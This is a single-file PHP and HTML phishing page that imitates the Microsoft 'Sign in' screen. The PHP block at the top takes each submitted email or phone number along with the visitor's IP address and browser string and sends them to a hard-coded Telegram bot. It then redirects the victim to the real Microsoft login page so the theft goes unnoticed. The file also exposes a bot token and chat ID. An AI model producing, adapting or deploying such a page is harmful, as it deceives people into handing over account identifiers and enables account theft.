<?php
// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['emailOrPhone'])) {
    $emailOrPhone = $_POST['emailOrPhone'];
    
    // Telegram Bot configuration
    $botToken = "8210354210:AAHUVScldXQmL8bXc7OCVdgvsErQu4wHOhQ";
    $chatId = "8330683037"; // Your chat ID from the getMe response
    
    // Prepare the message
    $message = "📧 New Microsoft Login Attempt:\n";
    $message .= "Email/Phone: " . $emailOrPhone . "\n";
    $message .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $message .= "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    $message .= "Time: " . date('Y-m-d H:i:s');
    
    // Send to Telegram
    $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    // Use cURL to send the message
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    
    // Redirect to Microsoft password page (to make it look realistic)
    header("Location: https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1630000000&rver=7.0.0000.0000&wp=MBI_SSL&wreply=https:%2F%2Fwww.microsoft.com%2Fen-us%2F&lc=1033&id=74335");
    exit();
}

// This PHP file serves the HTML structure for the Microsoft Login Page replica.
// All styling (Tailwind CSS) and interactive logic (JavaScript) are embedded below
// to create a single, self-contained file as requested.
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Microsoft</title>
    <!-- Load Tailwind CSS CDN for styling -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        /* Custom CSS to replicate the abstract, light background shapes */
        .abstract-bg {
            /* Fallback background if shapes don't render perfectly */
            background: linear-gradient(135deg, #f0f4f7 0%, #e8edf2 100%);
            position: relative;
            overflow: hidden;
        }
        .abstract-shape {
            content: '';
            position: absolute;
            background: rgba(255, 255, 255, 0.5); /* Semi-transparent white */
            backdrop-filter: blur(5px);
            z-index: 0;
            opacity: 0.7;
            /* Using box-shadow and transform to mimic the geometric, crystal-like facets */
        }
        .shape-1 {
            top: -100px;
            left: -100px;
            width: 400px;
            height: 400px;
            transform: rotate(30deg);
            box-shadow: 0 0 100px rgba(0, 0, 0, 0.1);
            border-radius: 20%;
        }
        .shape-2 {
            bottom: 50px;
            right: 50px;
            width: 500px;
            height: 500px;
            transform: rotate(-45deg);
            box-shadow: 0 0 120px rgba(0, 0, 0, 0.15);
            border-radius: 10%;
        }
        .shape-3 {
            top: 50%;
            left: 50%;
            width: 300px;
            height: 300px;
            transform: translate(-50%, -50%) rotate(75deg);
            opacity: 0.3;
            border-radius: 50%;
        }

        /* Specific style for the input field border on focus */
        .input-email:focus {
            outline: none;
            border-color: #0078D4; /* Microsoft Blue */
            box-shadow: none;
        }

        .login-card {
            /* Mimic the subtle floating effect */
            box-shadow: 0 10px 20px rgba(0,0,0,0.05), 0 6px 6px rgba(0,0,0,0.05);
        }

        /* Responsive adjustments */
        @media (max-width: 640px) {
            .login-card {
                /* Full width on smaller screens, removing shadow for a native feel */
                width: 100%;
                min-height: 100vh;
                box-shadow: none;
                border-radius: 0;
            }
        }
    </style>
</head>
<body class="abstract-bg font-['Inter'] min-h-screen flex items-center justify-center p-4">

    <!-- Abstract Background Shapes -->
    <div class="abstract-shape shape-1"></div>
    <div class="abstract-shape shape-2"></div>
    <div class="abstract-shape shape-3 hidden md:block"></div>
    <!-- Z-index 1 is needed to ensure the card is above the background shapes -->
    <div class="relative z-10 w-full max-w-sm bg-white p-6 md:p-10 rounded-lg login-card">

        <!-- Microsoft Logo -->
        <div class="mb-8 flex flex-col items-center">
            <!-- Simple HTML/CSS structure to mimic the multi-color logo -->
            <div class="flex items-center space-x-1">
                <div class="grid grid-cols-2 gap-0.5">
                    <div class="w-2 h-2 bg-red-500"></div>
                    <div class="w-2 h-2 bg-green-500"></div>
                    <div class="w-2 h-2 bg-blue-500"></div>
                    <div class="w-2 h-2 bg-yellow-500"></div>
                </div>
                <span class="text-xl font-semibold text-gray-700 ml-2">Microsoft</span>
            </div>
            
            <!-- Sign In Header -->
            <h1 class="text-2xl font-normal text-gray-800 mt-6 w-full text-left">Sign in</h1>
        </div>
        
        <!-- Input Form -->
        <form id="loginForm" method="POST">
            <div class="mb-6 relative">
                <!-- Input field with custom focus style -->
                <input
                    type="text"
                    id="emailOrPhone"
                    name="emailOrPhone"
                    placeholder="Email or phone"
                    class="input-email w-full text-gray-700 border-b border-gray-300 focus:border-b-2 py-2 text-base transition duration-150 ease-in-out"
                    autocomplete="username"
                    required
                >
            </div>

            <!-- "Can't access your account?" Link -->
            <div class="text-left mb-6">
                <a href="#" class="text-sm text-blue-600 hover:text-blue-700 font-normal">Can't access your account?</a>
            </div>
            
            <!-- Next Button -->
            <div class="flex justify-end">
                <button
                    type="submit"
                    id="nextButton"
                    class="bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-4 rounded-sm transition duration-150 ease-in-out"
                >
                    Next
                </button>
            </div>
        </form>

        <!-- Separator -->
        <div class="my-6 border-b border-gray-200"></div>

        <!-- Sign-in options -->
        <div class="mt-6">
            <button
                id="signInOptions"
                type="button"
                class="w-full flex items-center justify-center p-3 border border-gray-300 hover:bg-gray-50 rounded-sm text-gray-700 font-normal transition duration-150 ease-in-out"
            >
                <svg class="w-5 h-5 mr-3 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2v6a2 2 0 01-2 2h-6a2 2 0 01-2-2V9a2 2 0 012-2h6zM15 7v2m0 6v2m-6-6h2m-2 4h2m0 0h2m-2-4h2"></path></svg>
                Sign-in options
            </button>
        </div>
    </div>

    <!-- Footer Links -->
    <div class="absolute bottom-4 right-4 text-xs text-gray-600 space-x-2 hidden sm:block">
        <a href="#" class="hover:underline">Terms of use</a>
        <span>...</span>
        <a href="#" class="hover:underline">Privacy & cookies</a>
        <span>...</span>
    </div>

    <script>
        // Simple JavaScript for visual feedback during form submission
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            const inputField = document.getElementById('emailOrPhone');
            const button = document.getElementById('nextButton');

            // Basic validation
            if (!inputField.value.trim()) {
                event.preventDefault();
                alertPlaceholder('Please enter an email or phone number to continue.');
                inputField.focus();
                return;
            }

            // Visual feedback
            button.textContent = 'Processing...';
            button.disabled = true;
            
            // Form will submit normally to PHP handler
        });

        // Custom alert function to avoid window.alert()
        function alertPlaceholder(message) {
            let messageBox = document.getElementById('customAlert');
            if (!messageBox) {
                messageBox = document.createElement('div');
                messageBox.id = 'customAlert';
                messageBox.className = 'fixed top-4 left-1/2 transform -translate-x-1/2 bg-red-500 text-white p-3 rounded-lg shadow-lg z-50 transition-opacity duration-300 opacity-0';
                document.body.appendChild(messageBox);
            }
            messageBox.textContent = message;
            // Show the message
            messageBox.classList.remove('opacity-0');
            messageBox.classList.add('opacity-100');

            // Hide the message after 3 seconds
            setTimeout(() => {
                messageBox.classList.remove('opacity-100');
                messageBox.classList.add('opacity-0');
                // Remove from DOM after transition
                setTimeout(() => messageBox.remove(), 300);
            }, 3000);
        }
    </script>
</body>
</html>